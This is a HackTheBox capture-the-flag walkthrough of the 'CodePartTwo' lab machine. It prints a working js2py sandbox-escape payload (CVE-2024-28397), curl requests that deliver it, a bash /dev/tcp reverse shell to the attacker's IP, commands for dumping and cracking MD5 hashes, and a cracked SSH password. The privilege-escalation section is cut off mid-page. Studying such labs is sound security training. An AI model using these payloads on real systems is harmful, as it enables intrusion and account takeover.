d:T7834,<p>CodePartTwo is an Easy Linux machine that features a vulnerable Flask-based web application. Initial web enumeration reveals a JavaScript code editor powered by a vulnerable version of js2py, which allows for remote code execution via sandbox escape. Exploiting this flaw grants access to the system as an unprivileged user. Further enumeration reveals an SQLite database containing password hashes, which are cracked to gain SSH access. Finally, a backup utility, npbackup-cli, that runs with root privileges, is leveraged to obtain root privileges.</p><figure><img src="/writing/media/acbf27b99c1045c8d253707a.webp" alt="HackTheBox “CodePartTwo” Walkthrough, figure 1" width="300" height="300" loading="lazy" decoding="async" /></figure><h2 id="machine-info">Machine Info</h2><p>Target IP: 10.129.232.59<br />Attacker IP: 10.10.16.84<br />Difficulty: Easy<br />Category: Linux / Web Application / Sandbox Escape</p><p>— -</p><h2 id="1-mindset-and-approach">1. Mindset &amp; Approach</h2><p>When approaching any machine, we must think like an attacker following the Cyber Kill Chain:</p><p>1. Reconnaissance — What can we see from the outside?<br />2. Weaponization — What vulnerabilities match the exposed services?<br />3. Delivery — How do we get our exploit to the target?<br />4. Exploitation — How do we gain initial access?<br />5. Installation — How do we maintain persistence or stability?<br />6. Command &amp; Control — How do we interact with the compromised system?<br />7. Actions on Objectives — How do we escalate privileges and achieve our goal?</p><p>Why this matters: CodePartTwo teaches a critical lesson — sandboxing is hard. The application uses js2py.disable_pyimport() to prevent Python imports from JavaScript, yet the sandbox is still escapable. This is a classic example of security through obscurity failing. Just because you disabled one feature doesn’t mean you’ve closed all attack paths.</p><p>Our Strategy:<br />- Start broad (port scan), then narrow down (web app analysis)<br />- Follow the “download source code” breadcrumb<br />- Understand the technology stack (Flask + js2py)<br />- Research known vulnerabilities in the stack<br />- Chain low-privilege access to credential exposure to privilege escalation</p><p>— -</p><h2 id="2-initial-reconnaissance">2. Initial Reconnaissance</h2><p>2.1 Why Port Scan First?</p><p>Before touching any application, we need to understand the attack surface. A machine can only be compromised through exposed services. Port scanning tells us:<br />- What services are running<br />- What versions are installed (for CVE matching)<br />- What the operating system likely is<br />- Which ports are worth investigating further</p><p>2.2 The Command</p><p>nmap -sC -sV 10.129.232.59</p><p>Breaking it down:<br />- -p- scans all 65,535 TCP ports. We don’t want to miss anything.<br />- -sC runs default NSE scripts. These grab banners, check for common misconfigurations, and provide useful metadata.<br />- -sV enables version detection. Knowing the exact version of a service helps us find known exploits.</p><figure><img src="/writing/media/7d37a89c3e673d01b53277bc.webp" alt="HackTheBox “CodePartTwo” Walkthrough, figure 2" width="1200" height="562" loading="lazy" decoding="async" /></figure><p>Hacker Mindset: “Why guess when you can know?” Version detection is the difference between blindly throwing exploits and surgically selecting the right one.</p><p>2.3 Results Analysis</p><p>PORT STATE SERVICE VERSION<br /> 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.13<br /> 8000/tcp open http Gunicorn 20.0.4</p><p>What this tells us:<br />- Port 22 (SSH): Standard Ubuntu SSH. Not likely vulnerable to easy exploits, but we’ll keep credentials in mind for later.<br />- Port 8000 (Gunicorn): This is a Python WSGI HTTP server — almost certainly a Flask or Django application. The version 20.0.4 is old but not directly exploitable. The application logic is what matters here.<br />- OS: Ubuntu Linux, confirmed by the OpenSSH banner.</p><p>Decision Point: We have a web app on port 8000. This is our primary target. SSH is secondary — we’ll only use it once we have credentials.</p><p>Hacker Mindset: “Always enumerate before you exploit.” A web app on a non-standard port often means the developer didn’t harden it as much as a production-facing application.</p><p>— -</p><p>3. Web Application Enumeration</p><p>3.1 Why Register for an Account?</p><p>Many web applications expose different functionality to authenticated users versus anonymous visitors. By creating an account, we can:<br />- Access restricted pages (dashboards, admin panels)<br />- Discover additional API endpoints<br />- Test for broken access controls<br />- Find features that process user input (potential injection points)</p><p>3.2 Directory Discovery</p><p>Before registering, let’s see what pages exist:</p><p>dirsearch -u “<a href="http://10.129.232.59:8000/" rel="nofollow noopener noreferrer" target="_blank">http://10.129.232.59:8000</a>"</p><p>Results:<br />- /dashboard — Redirects to /login (requires authentication)<br />- /download — Source code download<br />- /login — Login page<br />- /logout — Logout endpoint<br />- /register — Registration page</p><figure><img src="/writing/media/5fa5c040ae3565ab81b3186a.webp" alt="HackTheBox “CodePartTwo” Walkthrough, figure 3" width="1200" height="636" loading="lazy" decoding="async" /></figure><p>Hacker Mindset: “The /download endpoint is a goldmine.” Getting the source code means we can perform white-box testing — analyzing the application logic for vulnerabilities instead of blindly guessing.</p><p>3.3 Registration &amp; Login</p><p># Register an account<br /> curl -s -X POST <a href="http://10.129.232.59:8000/register" rel="nofollow noopener noreferrer" target="_blank">http://10.129.232.59:8000/register</a> -d “username=test&amp;password=test”</p><p># Login and save session cookie<br /> curl -s -X POST <a href="http://10.129.232.59:8000/login" rel="nofollow noopener noreferrer" target="_blank">http://10.129.232.59:8000/login</a> -d “username=test&amp;password=test” -c cookies.txt</p><p>Why curl instead of a browser? It’s faster, scriptable, and reproducible. It also makes it easy to save session cookies for subsequent requests and is perfect for API testing.</p><figure><img src="/writing/media/9f86a9d12f97a100ebf3233a.webp" alt="HackTheBox “CodePartTwo” Walkthrough, figure 4" width="1200" height="450" loading="lazy" decoding="async" /></figure><p>Hacker Mindset: “Automation is key.” If you find yourself repeating the same clicks in a browser, you’re wasting time. Script everything you can.</p><p>3.4 Source Code Analysis</p><p>Downloading the source code reveals a Flask application with these key components:</p><p>js2py.disable_pyimport()<br /> app.config[‘SQLALCHEMY_DATABASE_URI’] = ‘sqlite:///users.db’</p><p>@app.route(‘/run_code’, methods=[‘POST’])<br /> def run_code():<br /> try:<br /> code = request.json.get(‘code’)<br /> result = js2py.eval_js(code)<br /> return jsonify({‘result’: result})<br /> except Exception as e:<br /> return jsonify({‘error’: str(e)})</p><p>Critical Observations:<br />1. js2py.disable_pyimport() — The developer tried to sandbox the JS execution by disabling Python imports. This is a red flag: it means they knew execution was dangerous but implemented an incomplete fix.<br />2. sqlite:///users.db — A local SQLite database. If we can read the filesystem, we might extract credentials.<br />3. /run_code — Accepts arbitrary JavaScript and evaluates it. This is our injection point.<br />4. Password hashing uses MD5 — Fast to crack with rainbow tables or hash databases.</p><figure><img src="/writing/media/165adf47a564c9e0787d2c36.webp" alt="HackTheBox “CodePartTwo” Walkthrough, figure 5" width="1200" height="512" loading="lazy" decoding="async" /></figure><p>Hacker Mindset: “When a developer explicitly disables a ‘dangerous’ feature, ask yourself: what other dangerous features did they forget about?” disable_pyimport() doesn’t stop Python object introspection.</p><p>— -</p><p>4. Vulnerability Analysis: CVE-2024–28397</p><p>4.1 What is js2py?</p><p>js2py is a Python library that translates JavaScript code into Python and executes it. The library exposes Python objects to JavaScript, which means JavaScript code can access Python’s internal machinery.</p><p>4.2 The Sandbox Escape</p><p>Even with js2py.disable_pyimport(), JavaScript code can still:<br />1. Get a Python-backed object: Object.getOwnPropertyNames({}) returns a dict_keys object<br />2. Access Python’s attribute system via .__getattribute__<br />3. Climb the class hierarchy: .__class__.__base__ reaches Python’s base object<br />4. Enumerate all loaded classes: object.__subclasses__()<br />5. Find subprocess.Popen and execute arbitrary commands</p><p>Why this works: Js2Py translates JS objects into Python wrappers. These wrappers retain Python’s introspection capabilities. The developer only blocked pyimport() (importing modules), but didn’t prevent access to already-loaded classes like subprocess.Popen.</p><p>Hacker Mindset: “Sandbox escapes are about finding the path of least resistance.” If the front door is locked, check the windows, the basement, and the chimney.</p><p>4.3 Payload Breakdown</p><p>(function(){<br /> // Step 1: Get a Python object wrapper<br /> var o = Object.getOwnPropertyNames({}).__getattribute__.__class__.__base__;</p><p>// Step 2: Get all subclasses of Python’s base object<br /> var s = o.__subclasses__();</p><p>// Step 3: Find subprocess.Popen<br /> var p;<br /> for(var i=0; i&lt;s.length; i++){<br /> if(s[i].__module__ == ‘subprocess’ &amp;&amp; s[i].__name__ == ‘Popen’){<br /> p = s[i];<br /> break;<br /> }<br /> }</p><p>// Step 4: Execute command and return output<br /> return p ? p(‘whoami’, -1, null, -1, -1, -1, null, null, true).communicate()[0].decode(‘utf-8’) : ‘Not Found’;<br /> })()</p><p>Understanding the Popen arguments:<br />- ‘whoami’ — The command to execute<br />- -1 — bufsize=-1 (default)<br />- null — executable=None<br />- -1, -1, -1 — stdin, stdout, stderr all piped<br />- null, null — preexec_fn=None, close_fds=-1<br />- true — shell=True, which means the command string is passed to /bin/sh -c, allowing shell syntax</p><p>Hacker Mindset: “Understand every argument.” Blind copy-pasting gets you nowhere when things break. Knowing that true enables shell=True tells us we can use shell metacharacters, pipes, and redirections.</p><p>— -</p><p>5. Initial Foothold: From JS to Shell</p><p>5.1 Testing RCE (Proof of Concept)</p><p>Before firing a reverse shell, we must confirm the exploit works. This is operational security: don’t expose your infrastructure until you know the target is vulnerable.</p><p>curl -s -X POST <a href="http://10.129.232.59:8000/run_code" rel="nofollow noopener noreferrer" target="_blank">http://10.129.232.59:8000/run_code</a> \<br /> -b cookies.txt \<br /> -H “Content-Type: application/json” \<br /> -d ‘{“code”:”(function(){ var o = Object.getOwnPropertyNames({}).__getattribute__.__class__.__base__; var s = o.__subclasses__(); var p; for(var i=0; i&lt;s.length; i++){ if(s[i].__module__ == ‘\’’subprocess’\’’ &amp;&amp; s[i].__name__ == ‘\’’Popen’\’’){ p = s[i]; break; } } return p ? p(‘\’’whoami’\’’, -1, null, -1, -1, -1, null, null, true).communicate()[0].decode(‘\’’utf-8'\’’) : ‘\’’Not Found’\’’; })()”}’</p><p>Response: {“result”:”app\n”}</p><p>Analysis:<br />- The application runs as user app (not www-data as we might expect)<br />- RCE is confirmed<br />- We have arbitrary command execution</p><figure><img src="/writing/media/1fd405286cf3916203d1565a.webp" alt="HackTheBox “CodePartTwo” Walkthrough, figure 6" width="1200" height="322" loading="lazy" decoding="async" /></figure><p>Hacker Mindset: “Start small, then scale.” A whoami test is quiet, fast, and tells you exactly what context you’re operating in.</p><p>5.2 Reverse Shell Payload</p><p>Now we replace whoami with a bash reverse shell:</p><p>bash -c “bash -i &gt;&amp; /dev/tcp/10.10.16.84/4444 0&gt;&amp;1”</p><p>How the reverse shell works:<br />- bash -c executes the following string in a new bash instance<br />- bash -i spawns an interactive bash shell<br />- &gt;&amp; /dev/tcp/10.10.16.84/4444 redirects stdout and stderr to a TCP socket<br />- 0&gt;&amp;1 redirects stdin to the same socket, completing the bidirectional pipe</p><p>Why /dev/tcp? This is a bash built-in feature (not a real filesystem path) that creates TCP connections. It’s incredibly useful for reverse shells because it requires no external tools like nc.</p><p>The full exploit:</p><p># Terminal 1: Start listener<br /> nc -lvnp 4444</p><p># Terminal 2: Send payload<br /> curl -s -X POST <a href="http://10.129.232.59:8000/run_code" rel="nofollow noopener noreferrer" target="_blank">http://10.129.232.59:8000/run_code</a> \<br /> -b cookies.txt \<br /> -H “Content-Type: application/json” \<br /> -d ‘{“code”:”(function(){ var o = Object.getOwnPropertyNames({}).__getattribute__.__class__.__base__; var s = o.__subclasses__(); var p; for(var i=0; i&lt;s.length; i++){ if(s[i].__module__ == ‘\’’subprocess’\’’ &amp;&amp; s[i].__name__ == ‘\’’Popen’\’’){ p = s[i]; break; } } return p ? p(‘\’’bash -c “bash -i &gt;\\&amp; /dev/tcp/10.10.16.84/4444 0&gt;\\&amp;1”’\’’, -1, null, -1, -1, -1, null, null, true).communicate()[0].decode(‘\’’utf-8'\’’) : ‘\’’Not Found’\’’; })()”}’</p><p>Note: The curl command will hang because communicate() waits for the subprocess to finish. The subprocess won’t finish until you close the reverse shell. This is normal.</p><figure><img src="/writing/media/2eaa900905d972121eb3cdc7.webp" alt="HackTheBox “CodePartTwo” Walkthrough, figure 7" width="1200" height="215" loading="lazy" decoding="async" /></figure><p>Hacker Mindset: “Your exploit is a transaction.” The HTTP request hangs, but that’s okay — the shell has already been spawned on the other side. Don’t panic when your terminal freezes; check your listener.</p><p>5.3 Stabilizing the Shell</p><p>Once connected:</p><p>$ id<br /> uid=1001(app) gid=1001(app) groups=1001(app)</p><p>Why stabilize? Basic reverse shells don’t handle Ctrl+C, Ctrl+Z, or terminal resizing. A stable shell lets you run interactive commands.</p><p>python3 -c “import pty; pty.spawn(‘/bin/bash’)”<br /> # Press Ctrl+Z to background<br /> # On Kali:<br /> stty raw -echo; fg<br /> # Press Enter twice, then in the shell:<br /> export TERM=xterm</p><figure><img src="/writing/media/4d529d03e63b358333856fd8.webp" alt="HackTheBox “CodePartTwo” Walkthrough, figure 8" width="1200" height="457" loading="lazy" decoding="async" /></figure><p>Hacker Mindset: “A shell is just the beginning.” Getting access is 10% of the work; making it usable is the other 90%.</p><p>— -</p><p>6. User Pivot: Credential Harvesting</p><p>6.1 Why Look for Databases?</p><p>The source code revealed sqlite:///users.db. SQLite databases are just files on disk. If the application can read them, and we’re running as the application user, we can read them too.</p><p>Hacker Mindset: “Trust the source code.” Developers often leave breadcrumbs — hardcoded paths, comments, debug info — that reveal where sensitive data lives.</p><p>6.2 Extracting the Database</p><p>cd /home/app/app/instance<br /> ls -la<br /> sqlite3 users.db “.tables”<br /> sqlite3 users.db “SELECT * FROM user;”</p><p>Results:</p><p>1|marco|649c9d65a206a75f5abe509fe128bce5<br /> 2|app|a97588c0e2fa3a024876339e27aeb42e<br /> 3|test|098f6bcd4621d373cade4e832627b4f6</p><figure><img src="/writing/media/59506da1955fa5643b15ddda.webp" alt="HackTheBox “CodePartTwo” Walkthrough, figure 9" width="1182" height="668" loading="lazy" decoding="async" /></figure><p>Analysis:<br />- User marco has an MD5 password hash<br />- MD5 is cryptographically broken and fast to crack<br />- The hash 649c9d65a206a75f5abe509fe128bce5 is easily crackable</p><p>6.3 Cracking the Hash</p><p>Method 1: Online databases (fastest for CTFs)<br />- Use CrackStation or similar<br />- Input: 649c9d65a206a75f5abe509fe128bce5<br />- Output: sweetangelbabylove</p><p>Method 2: Hashcat (offline)</p><p>hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt</p><p>Why MD5 is bad for passwords:<br />- No salt means rainbow tables work instantly<br />- Fast computation allows billions of guesses per second on GPUs</p><figure><img src="/writing/media/411571bf16b5450f37697a4e.webp" alt="HackTheBox “CodePartTwo” Walkthrough, figure 10" width="1200" height="1203" loading="lazy" decoding="async" /></figure><p>Hacker Mindset: “Passwords are just secrets waiting to be told.” Never assume a hash protects a credential. Always try to crack it.</p><p>6.4 SSH as Marco</p><p>Now we pivot to a stable, interactive shell via SSH:</p><p>ssh marco@10.129.232.59<br /> # Password: sweetangelbabylove</p><p>Why SSH instead of staying in the reverse shell?<br />- Full TTY with proper terminal handling<br />- Persistent session (won’t die if the web app restarts)<br />- Easier to run sudo, vim, and other interactive tools<br />- Less noisy (no constant HTTP requests)</p><figure><img src="/writing/media/a24d2cb861044ca6c5a979a1.webp" alt="HackTheBox “CodePartTwo” Walkthrough, figure 11" width="1104" height="1190" loading="lazy" decoding="async" /></figure><p>Hacker Mindset: “Upgrade your access whenever possible.” A reverse shell through a web app is fragile. SSH is robust, quiet, and professional.</p><p>— -</p><h2 id="7-privilege-escalation-abusing-npbackup-cli">7. Disabling pyimport() doesn’t stop object introspection. Any bridge between languages (JS to Python, Lua to C, etc.) introduces escape opportunities.</p><p>2. MD5 has no place in password storage. Always use slow, salted hashes like bcrypt, scrypt, or Argon2.</p><p>3. NOPASSWD sudo on complex tools is dangerous. Backup tools, package managers, and container runtimes often execute configurable pre/post scripts. Audit these carefully.</p><p>4. Source code is the ultimate enumeration. The /download endpoint gave us everything we needed. Never skip source code review when available.</p><h2 id="methodological-lessons">Methodological Lessons:</h2><p>1. Follow the breadcrumbs: Download endpoint → source code → js2py → CVE research → exploit.<br />2. Chain your exploits: RCE as app → credential exposure → SSH as marco → sudo abuse → root.<br />3.
